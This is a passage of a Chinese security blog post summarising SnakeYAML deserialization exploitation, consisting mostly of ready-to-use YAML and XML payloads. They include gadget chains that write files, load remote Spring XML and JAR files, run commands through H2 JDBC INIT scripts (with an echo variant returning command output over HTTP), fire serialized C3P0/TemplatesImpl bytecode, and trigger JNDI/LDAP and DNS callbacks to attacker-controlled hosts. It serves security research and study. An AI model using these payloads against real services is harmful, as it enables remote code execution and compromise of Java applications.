+<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>1、java.io.ObjectOutputStream#ObjectOutputStream(java.io.OutputStream)能触发out.write，有可能可以写文件</p>
+<h2 id="Marshal-ClassPathXmlApplicationContext"><a href="#Marshal-ClassPathXmlApplicationContext" class="headerlink" title="Marshal+ClassPathXmlApplicationContext"></a>Marshal+ClassPathXmlApplicationContext</h2><p>jdk8只支持spring-boot-starter-web 2.xx版本，3版本必须用jdk17</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>先通过Marsal写xml：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!sun.rmi.server.MarshalOutputStream</span> [<span class="type">!!java.util.zip.InflaterOutputStream</span> [<span class="type">!!java.io.FileOutputStream</span> [<span class="type">!!java.io.File</span> [<span class="string">&quot;success.jar&quot;</span>],<span class="literal">false</span>],<span class="type">!!java.util.zip.Inflater</span> &#123; <span class="attr">input:</span> <span class="type">!!binary</span> <span class="string">eJxLLE5JTCkGAAh5AnE=</span> &#125;,<span class="number">1048576</span>]]</span><br></pre></td></tr></table></figure>
+
+<p>再加载xml:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.springframework.context.support.ClassPathXmlApplicationContext</span> [ <span class="string">&quot;http://example.com/spring.xml&quot;</span> ]</span><br></pre></td></tr></table></figure>
+
+<p>xml格式：可以用java-chains生成</p>
+<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754273304910.png"  alt="img"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;decoder&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;staticMethod&quot;</span> <span class="attr">value</span>=<span class="string">&quot;javax.xml.bind.DatatypeConverter.parseBase64Binary&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;arguments&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>yv66vgAAADIAQAEAaW9yZy9hcGFjaGUvY29sbGVjdGlvbnMvY295b3RlL2pzb25Gb3JtYXRWaXNpdG9ycy9Kc29uSW50ZWdlckZvcm1hdFZpc2l0b3IyYTEzOGQ4MmU3MjQ0OWMzYTU3Y2NjMzYzYTMyMTcwYgcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAARiYXNlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADc2VwAQADY21kAQAGPGluaXQ+AQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACwwACQAKCgAEAA0BAAdvcy5uYW1lCAAPAQAQamF2YS9sYW5nL1N5c3RlbQcAEQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMABMAFAoAEgAVAQAQamF2YS9sYW5nL1N0cmluZwcAFwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsMABkAGgoAGAAbAQADd2luCAAdAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAB8AIAoAGAAhAQAHY21kLmV4ZQgAIwwABQAGCQACACUBAAIvYwgAJwwABwAGCQACACkBAAcvYmluL3NoCAArAQACLWMIAC0MAAgABgkAAgAvAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwAxAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwACQAzCgAyADQBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwANgA3CgAyADgBAAg8Y2xpbml0PgEABGNhbGMIADsKAAIADQEABENvZGUBAA1TdGFja01hcFRhYmxlACEAAgAEAAAAAwAJAAUABgAAAAkABwAGAAAACQAIAAYAAAACAAEACQAKAAEAPgAAAIQABAACAAAAUyq3AA4SELgAFrYAHBIetgAimQAQEiSzACYSKLMAKqcADRIsswAmEi6zACoGvQAYWQOyACZTWQSyACpTWQWyADBTTLsAMlkrtwA1tgA5V6cABEyxAAEABABOAFEADAABAD8AAAAXAAT/ACEAAQcAAgAACWUHAAz8AAAHAAQACAA6AAoAAQA+AAAAGgACAAAAAAAOEjyzADC7AAJZtwA9V7EAAAAAAAA=<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;classLoader&quot;</span> <span class="attr">class</span>=<span class="string">&quot;javax.management.loading.MLet&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;clazz&quot;</span> <span class="attr">factory-bean</span>=<span class="string">&quot;classLoader&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;defineClass&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">&quot;decoder&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> <span class="attr">value</span>=<span class="string">&quot;914&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">factory-bean</span>=<span class="string">&quot;clazz&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;newInstance&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="简要分析-2"><a href="#简要分析-2" class="headerlink" title="简要分析"></a>简要分析</h3><p>这个也是两步，写文件，本地读文件，ClassXml那个类的构造方法为什么能触发可以自行学习一下。</p>
+<h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754273315656.png"  alt="img"></p>
+<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754273316151.png"  alt="img"></p>
+<p>2.1及以上版本只支持jdk17，且使用的是五个参数的构造函数，exp：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.h2.jdbc.JdbcConnection</span> [ <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException &#123; Runtime.getRuntime().exec(\&quot;calc.exe\&quot;)\\; &#125;$$\\;CALL EXEC ()\\;&quot;</span>, &#123;&#125;, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="literal">false</span> ]</span><br></pre></td></tr></table></figure>
+
+<p>2.0及以下版本，支持jdk8，但只有2.0可打，且使用的是四个参数的构造函数，其exp：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.h2.jdbc.JdbcConnection</span> [ <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException &#123; Runtime.getRuntime().exec(\&quot;calc.exe\&quot;)\\; &#125;$$\\;CALL EXEC ()\\;&quot;</span>, &#123;&#125;, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>1.9版本没法打，因为其org.h2.jdbcx.JdbcDataSource#getConnection()，没有触发构造方法。</p>
+<p>上面的yaml也可以分行写：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.h2.jdbc.JdbcConnection</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">jdbc:h2:mem:test</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">MODE:</span> <span class="string">MSSQLServer</span></span><br><span class="line">  <span class="attr">INIT:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    drop alias if exists exec;</span></span><br><span class="line"><span class="string">    CREATE ALIAS EXEC AS $$void exec() throws Exception &#123;Runtime.getRuntime().exec(&quot;calc.exe&quot;);&#125;$$;</span></span><br><span class="line"><span class="string">    CALL EXEC ();</span></span><br><span class="line"><span class="string"></span><span class="bullet">-</span> <span class="string">a</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">b</span></span><br><span class="line"><span class="bullet">-</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<p>url中的xxx&#x3D;xxx其实就是properties的形式，可以写到构造函数的第二个参数里</p>
+<p>Properties写成一行的话就是{MODE: MSSQLServer, INIT: …}</p>
+<p>INIT后面的 | ，表示多行文本块。</p>
+<p>springboot回显exp：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.h2.jdbc.JdbcConnection</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">jdbc:h2:mem:test</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">MODE:</span> <span class="string">MSSQLServer</span></span><br><span class="line">  <span class="attr">INIT:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    DROP ALIAS IF EXISTS EXEC;</span></span><br><span class="line"><span class="string">    CREATE ALIAS EXEC AS $$void exec() throws Exception &#123;org.springframework.util.StreamUtils.copy(java.lang.Runtime.getRuntime().exec(&quot;id&quot;).getInputStream(),((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes()).getResponse().getOutputStream());&#125;$$;</span></span><br><span class="line"><span class="string">    CALL EXEC ();</span></span><br><span class="line"><span class="string"></span><span class="bullet">-</span> <span class="string">a</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">b</span></span><br><span class="line"><span class="bullet">-</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="简要分析-3"><a href="#简要分析-3" class="headerlink" title="简要分析"></a>简要分析</h3><p>这里主要是H2SQL打JDBC</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13371/" >JDBC-Attack 攻击利用汇总-先知社区<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="C3P0二次反序列化"><a href="#C3P0二次反序列化" class="headerlink" title="C3P0二次反序列化"></a>C3P0二次反序列化</h2><p>可以出网也可以不出网。还是推荐用Java-chain工具生成。</p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>这个是TemplatesImpl加载字节码执行calc的</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</span></span><br><span class="line">  <span class="attr">userOverridesAsString:</span> <span class="string">&quot;HexAsciiSerializedMap:aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870000000027372002b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e436f6d70617261746f72e3a188ea7322a4480200024c000a636f6d70617261746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e672f537472696e673b78707372002a6a6176612e6c616e672e537472696e672443617365496e73656e736974697665436f6d70617261746f7277035c7d5c50e5ce02000078707400106f757470757450726f706572746965737704000000037372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e00200007870000003b3cafebabe0000003200420100446f72672f6170616368652f736869726f2f636f796f74652f4f626a6563745265616465723839656130316663313231623435316562333435643937303234353266633031070001010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c6574070003010004626173650100124c6a6176612f6c616e672f537472696e673b010003736570010003636d640100063c696e69743e0100032829560100136a6176612f6c616e672f457863657074696f6e07000b0c0009000a0a0004000d0100076f732e6e616d6508000f0100106a6176612f6c616e672f53797374656d07001101000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0c001300140a001200150100106a6176612f6c616e672f537472696e6707001701000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b0c0019001a0a0018001b01000377696e08001d010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a0c001f00200a00180021010007636d642e6578650800230c0005000609000200250100022f630800270c0007000609000200290100072f62696e2f736808002b0100022d6308002d0c00080006090002002f0100186a6176612f6c616e672f50726f636573734275696c646572070031010016285b4c6a6176612f6c616e672f537472696e673b29560c000900330a00320034010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0c003600370a003200380100106a6176612f6c616e672f4f626a65637407003a0100083c636c696e69743e01000463616c6308003d0a0002000d010004436f646501000d537461636b4d61705461626c6500210002000400000003000900050006000000090007000600000009000800060000000200010009000a000100400000008400040002000000532ab7000e1210b80016b6001c121eb600229900101224b300261228b3002aa7000d122cb30026122eb3002a06bd00185903b20026535904b2002a535905b20030534cbb0032592bb70035b6003957a700044cb100010004004e0051000c00010041000000170004ff002100010700020000096507000cfc000007003b0008003c000a000100400000001a000200000000000e123eb30030bb000259b7003f57b10000000000007074002431666639653232642d663032362d346461382d626363622d666362363936616265636534707701007871007e000d78;&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h1><p>这里大多是一些常规JNDI打法。能不能用需要判断一下jdk版本有没有限制JNDI反序列化，有没有模块化机制，能不能绕过。</p>
+<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!com.sun.rowset.JdbcRowSetImpl</span></span><br><span class="line"><span class="attr">dataSourceName:</span> <span class="string">&quot;ldap://127.0.0.1:50389/8ebd8d&quot;</span></span><br><span class="line"><span class="attr">autoCommit:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Dns"><a href="#Dns" class="headerlink" title="Dns"></a>Dns</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="type">!!java.net.URL</span> [<span class="string">&quot;http://321213.n4s0yv3nfxrbbvlddamiykomhdn4buzj.oastify.com/&quot;</span>]<span class="string">:</span> <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的{URL: 1}，是为了让SnakeYaml解析成Map的形式，这样才会触发key.hashCode()的逻辑。</p>
+<h2 id="SpiLoadJar"><a href="#SpiLoadJar" class="headerlink" title="SpiLoadJar"></a>SpiLoadJar</h2><p>最经典的</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!!java.net.URLClassLoader</span></span><br><span class="line">  <span class="bullet">-</span> <span class="bullet">-</span> <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://127.0.0.1:8888/success.jar&quot;</span>]</span><br><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://127.0.0.1:8888/success.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<h2 id="SimpleJndiBeanFactory"><a href="#SimpleJndiBeanFactory" class="headerlink" title="SimpleJndiBeanFactory"></a>SimpleJndiBeanFactory</h2><p>需要spring-bean依赖，一般spring自带。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.springframework.beans.factory.config.PropertyPathFactoryBean</span> &#123;<span class="attr">targetBeanName:</span> <span class="string">&quot;ldap://127.0.0.1:50389/8ebd8d&quot;</span>, <span class="attr">propertyPath:</span> <span class="string">&quot;xxxx&quot;</span>, <span class="attr">beanFactory:</span> <span class="type">!!org.springframework.jndi.support.SimpleJndiBeanFactory</span> &#123;<span class="attr">shareableResources:</span> [<span class="string">&quot;ldap://127.0.0.1:50389/8ebd8d&quot;</span>]&#125;&#125;</span><br><span class="line"><span class="type">!!org.springframework.beans.factory.config.PropertyPathFactoryBean</span></span><br><span class="line"><span class="attr">targetBeanName:</span> <span class="string">ldap://127.0.0.1:50389/8ebd8d</span></span><br><span class="line"><span class="attr">propertyPath:</span> <span class="string">xxx</span></span><br><span class="line"><span class="attr">beanFactory:</span> <span class="type">!!org.springframework.jndi.support.SimpleJndiBeanFactory</span></span><br><span class="line">  <span class="attr">shareableResources:</span> [<span class="string">&quot;ldap://127.0.0.1:50389/8ebd8d&quot;</span>]</span><br><span class="line"><span class="type">!!org.springframework.beans.factory.config.PropertyPathFactoryBean</span></span><br><span class="line"><span class="attr">targetBeanName:</span> <span class="string">ldap://127.0.0.1:50389/8ebd8d</span></span><br><span class="line"><span class="attr">propertyPath:</span> <span class="string">xxx</span></span><br><span class="line"><span class="attr">beanFactory:</span> <span class="type">!!org.springframework.jndi.support.SimpleJndiBeanFactory</span></span><br><span class="line">  <span class="attr">shareableResources:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ldap://127.0.0.1:50389/8ebd8d</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="C3p0Jndi"><a href="#C3p0Jndi" class="headerlink" title="C3p0Jndi"></a>C3p0Jndi</h2><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!com.mchange.v2.c3p0.JndiRefForwardingDataSource</span></span><br><span class="line"><span class="attr">jndiName:</span> <span class="string">&quot;ldap://127.0.0.1:50389/8ebd8d&quot;</span></span><br><span class="line"><span class="attr">loginTimeout:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="XBean"><a href="#XBean" class="headerlink" title="XBean"></a>XBean</h2><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.management.BadAttributeValueExpException</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;baka&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="type">!!javax.naming.Reference</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;any&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;CalcAbs&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;http://127.0.0.1:7778/&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="type">!!org.apache.xbean.naming.context.WritableContext</span> []</span><br></pre></td></tr></table></figure>
+
+<p>这里是直接从远程加载.class文件，Reference的第二个参数是.class文件的类名，如果有包名前面要写包名。url最后的斜杠不能少。</p>
+<p>注意，这个最后走的是Codebase加载字节码，这个跟rmi一样，8u121就被禁了，实用性比较低。</p>
+<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754294753958.png"  alt="img"></p>
+<h2 id="Commons-Configuration"><a href="#Commons-Configuration" class="headerlink" title="Commons-Configuration"></a>Commons-Configuration</h2><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?</span> <span class="type">!!org.apache.commons.configuration.ConfigurationMap</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!!org.apache.commons.configuration.JNDIConfiguration</span></span><br><span class="line">   <span class="bullet">-</span> <span class="type">!!javax.naming.InitialContext</span> []</span><br><span class="line">   <span class="bullet">-</span> <span class="string">&quot;ldap://127.0.0.1:50389/8ebd8d&quot;</span></span><br><span class="line"><span class="string">:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>多行时，不支持直接把一个复杂类作为键，需要用?表示键的开始。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.apache.commons.configuration.ConfigurationMap</span> [<span class="type">!!org.apache.commons.configuration.JNDIConfiguration</span> [<span class="type">!!javax.naming.InitialContext</span> [], <span class="string">&quot;ldap://127.0.0.1:50389/8ebd8d&quot;</span>]] <span class="string">:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="依赖探测"><a href="#依赖探测" class="headerlink" title="依赖探测"></a>依赖探测</h2><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前面的类存在，后面才会有dns解析记录</span></span><br><span class="line">&#123;<span class="type">!!org.apache.commons.configuration.JNDIConfiguration</span> &#123;&#125;<span class="string">:</span> <span class="number">0</span>, <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://JNDIConfiguration.sxt5r0ws82kg40ei6ffnrphraig942sr.oastify.com&quot;</span>]<span class="string">:</span> <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里要求被探测的类有无参构造或者是一个接口，不然会因为没有合适的构造方法而报错。</p>
+<h1 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h1><p>SnakeYaml利用要关注构造方法，能通过构造方法触发的链子，都可以尝试迁移到SnakeYaml。</p>
+<p>同时也要关注字段为private或protected或static，且其setter只有一个参数的public setter方法。</p>
+<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754294777978.png"  alt="img"></p>
+<p>这个public不能进，进去了就变成FieldProperty了，那到时候调用property.set时就不会调用invoke。</p>
+<p>setter不是public的话，会在这里抛出：</p>
+<p><img   src="/2025/05/03/JNI/eYaml%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-1754294777947.png"  alt="img"></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                SnakeYaml利用总结
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/08/03/SnakeYaml利用总结/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-08-03 16:27</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/08/04/Yaml%E6%96%87%E4%BB%B6%E5%86%99%E6%B3%95%E6%80%BB%E7%BB%93/"
+                                   title="Yaml文件写法总结"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Yaml文件写法总结</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/08/02/WebGoat%E9%9D%B6%E5%9C%BA-XSS/"
+                                   title="WebGoat靶场-XSS"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">WebGoat靶场-XSS</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
